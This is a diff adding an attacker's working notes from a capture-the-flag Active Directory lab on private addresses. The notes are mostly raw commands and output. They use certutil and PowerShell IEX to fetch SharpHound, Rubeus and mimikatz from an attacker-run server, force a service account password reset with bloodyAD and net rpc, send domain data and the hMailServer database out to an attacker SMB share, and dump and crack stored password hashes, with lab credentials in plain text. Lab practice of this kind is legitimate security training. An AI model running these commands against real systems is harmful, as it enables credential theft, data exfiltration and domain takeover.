@@ -507,7 +507,247 @@ d-----         10/6/2025   1:42 PM                vicky.tale
 
 =============================================================================================================================================================================================
 
-=============================================================================================================================================================================================
+
+
+
+ .\SharpHound.exe -c All --memcache --outputdirectory \\192.168.56.3\shares\ --zipfilename curiosity3 --outputprefix  HTB-- randomdilesnames
+
+
+
+
 
 =============================================================================================================================================================================================
 
+certutil -urlcache -split -f "http://192.168.56.3:8000/SharpHound.exe" "SharpHound.exe"
+
+
+certutil -urlcache -split -f "http://192.168.56.3:8000/Rubeus.exe" "Rubeus.exe"
+
+
+
+
+
+certutil -urlcache -split -f "http://192.168.56.3:8000/Invoke-Mimikatz.ps1" "Invoke-Mimikatz.ps1"
+
+
+
+
+certutil -urlcache -split -f "http://192.168.56.3:8000/mimikatz.exe" "mimikatz.exe"
+
+
+=============================================================================================================================================================================================
+https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip
+
+https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1
+
+https://ju4ncaa.github.io/posts/curiosity/
+
+https://medium.com/@amaraltohami30/attacktive-directory-ctf-tryhackme-walkthrough-c118639440cc
+
+
+
+https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt
+
+
+
+https://medium.com/@amaraltohami30/attacktive-directory-ctf-tryhackme-walkthrough-c118639440cc
+
+
+
+https://medium.com/@josephalan17201972/tryhackme-wreath-network-write-up-part-3-c661906bbbee
+
+
+
+net rpc password "svcpool" "Patito12345" -U 'curiosity.thl'/'vicky.tale'%'Hola1234$' -S 192.168.56.19
+
+
+
+
+http://192.168.56.3:8000/SharpHound.exe SharpHound.exe
+
+
+
+
+.\SharpHound.exe -c All --domain curiosity.thl --zippassword 'p@ssw0rd' --outputprefix 'SEVENKINGDOMS'
+
+
+=============================================================================================================================================================================================
+
+└─$ sudo impacket-smbserver share ./ -smb2support -user test -pass test
+
+
+*Evil-WinRM* PS C:\temp> net use \\192.168.56.3\share /user:test test
+
+
+
+
+
+
+*Evil-WinRM* PS C:\temp>  .\SharpHound.exe -c All --memcache --outputdirectory \\192.168.56.3\share\ --zipfilename curiosity3
+
+
+
+=============================================================================================================================================================================================
+
+bloodyAD -d 'curiosity.thl' --dc-ip 192.168.56.19 -u 'vicky.tale' -p 'Hola1234$' set password svcpool 'Patito12345'
+
+
+
+
+
+net rpc password "svcpool" "Patito12345" -U 'curiosity.thl'/'vicky.tale'%'Hola1234$' -S 192.168.56.19
+
+
+
+
+
+IEX (New-Object Net.WebClient).DownloadString('Invoke-Mimikatz.ps1')
+
+
+Get-ChildItem C:\ -Name "*pass*" -Recurse -ErrorAction SilentlyContinue 2>$null
+
+
+
+
+
+
+
+*Evil-WinRM* PS C:\temp> type "C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini"
+ 
+[Directories]
+ProgramFolder=C:\Program Files (x86)\hMailServer
+DatabaseFolder=C:\Program Files (x86)\hMailServer\Database
+DataFolder=C:\Program Files (x86)\hMailServer\Data
+LogFolder=C:\Program Files (x86)\hMailServer\Logs
+TempFolder=C:\Program Files (x86)\hMailServer\Temp
+EventFolder=C:\Program Files (x86)\hMailServer\Events
+[GUILanguages]
+ValidLanguages=english,swedish
+[Security]
+AdministratorPassword=2497b84ec6e585a607b7c4d01f873c65
+[Database]
+Type=MSSQLCE
+Username=
+Password=d2ce9be246f168161d97aef4f8d648e5
+PasswordEncryption=1
+Port=0
+Server=
+Database=hMailServer
+Internal=1
+
+
+
+
+
+
+=============================================================================================================================================================================================
+
+
+
+
+
+
+└─$ python3 gohash.py                                             
+
+
+     ██████╗  ██████╗       ██╗  ██╗ █████╗ ███████╗██╗  ██╗
+    ██╔════╝ ██╔═══██╗      ██║  ██║██╔══██╗██╔════╝██║  ██║                                                                                                
+    ██║  ███╗██║   ██║█████╗███████║███████║███████╗███████║                                                                                                
+    ██║   ██║██║   ██║╚════╝██╔══██║██╔══██║╚════██║██╔══██║                                                                                                
+    ╚██████╔╝╚██████╔╝      ██║  ██║██║  ██║███████║██║  ██║                                                                                                
+     ╚═════╝  ╚═════╝       ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝                                                                                                
+            <<------ C O D E   B Y   H U N X ------>>                                                                                                       
+                       < Hash identified >                                                                                                                  
+                                                                                                                                                            
+  [+] Enter Your Hash : 2497b84ec6e585a607b7c4d01f873c65                                                                                                    
+                                                                                                                                                            
+  ===================== Show Algorithm Hash ====================                                                                                            
+                                                                                                                                                            
+  [+] Hash : 2497b84ec6e585a607b7c4d01f873c65                                                                                                               
+  [+] Algorithm : MD5                                                                                                                                       
+                                                                                                                                                            
+  ==============================================================                                                                                            
+                                                                                                                                                            
+  Do you want to identify the hash again? Y/N : y                                                                                                           
+                                                                                                                                                            
+  [+] Enter Your Hash : d2ce9be246f168161d97aef4f8d648e5                                                                                                    
+                                                                                                                                                            
+  ===================== Show Algorithm Hash ====================                                                                                            
+                                                                                                                                                            
+  [+] Hash : d2ce9be246f168161d97aef4f8d648e5                                                                                                               
+  [+] Algorithm : MD5                                                                                                                                       
+                                                                                                                                                            
+  ==============================================================                                                                                            
+                                                                                                                                                            
+  Do you want to identify the hash again? Y/N : N                                                                                                           
+  Exit ToolS !!!                                                                                                                                            
+                                                                                                                                                            
+┌──(kali㉿kali)-[~/Documents/Go-Hash]
+└─$ echo "2497b84ec6e585a607b7c4d01f873c65" > hmail_hashes.txt
+
+
+
+
+
+2497b84ec6e585a607b7c4d01f873c65 : Tumama1
+
+
+
+d2ce9be246f168161d97aef4f8d648e5       Désolé, nous n'avons pas trouvé de correspondance pour ce(s) hash(s)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Evil-WinRM* PS C:\temp> Get-ChildItem "C:\Program Files (x86)\hMailServer\" -Recurse -Include *.sdf -ErrorAction SilentlyContinue
+ 
+
+
+    Directory: C:\Program Files (x86)\hMailServer\Database
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         10/6/2025   1:31 PM         610304 hMailServer.sdf
+
+
+*Evil-WinRM* PS C:\temp> 
+
+
+
+
+
+
+
+
+
+
+
+
+
+smbclient //CURIOSITY-DC/C$/ -U 'vicky.tale%Hola1234$' -c "get 'Program Files (x86)/hMailServer/Database/hMailServer.sdf' hMailServer.sdf"
+
+
+
+
+
+
+
+
+
+copy "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" \\192.168.56.3\share\hMailServer.sdf
+
+
+
+
+evil-winrm -i 192.168.56.19 -u 'vicky.tale' -p 'Hola1234$' 
